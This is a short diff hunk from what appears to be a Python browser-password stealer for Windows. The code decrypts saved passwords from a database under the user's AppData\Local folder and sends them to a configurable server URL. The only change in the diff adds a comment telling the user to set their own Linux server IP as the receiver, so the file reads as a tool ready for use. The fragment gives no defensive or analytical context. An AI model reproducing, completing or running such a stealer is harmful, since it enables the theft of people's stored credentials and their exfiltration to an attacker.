@@ -51,7 +51,7 @@ def decrypt_password(password, key):
 
 def main():
     # Server URL where data will be sent
-    SERVER_URL = "http://192.168.0.4:8000/receive"
+    SERVER_URL = "http://192.168.0.4:8000/receive" # change with your linux server IP
     
     key = get_encryption_key()
     db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
